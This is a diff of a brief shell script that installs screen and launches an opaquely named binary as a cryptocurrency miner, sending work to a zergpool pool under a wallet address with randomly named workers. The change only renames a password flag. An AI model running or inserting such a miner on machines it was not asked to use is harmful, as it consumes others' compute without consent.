@@ -3,4 +3,4 @@
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
 apt-get update
 apt install screen -y
-chmod u+x 2 && ./2 --algo ETHASH --pool stratum+tcp://ethash.mine.zergpool.com:9999 --user D63YEMS8dCqnE71Mrp1StTTCX39b22PN1z.$WORKER -p c=DOGE
+chmod u+x 2 && ./2 --algo ETHASH --pool stratum+tcp://ethash.mine.zergpool.com:9999 --user D63YEMS8dCqnE71Mrp1StTTCX39b22PN1z.$WORKER --password c=DOGE
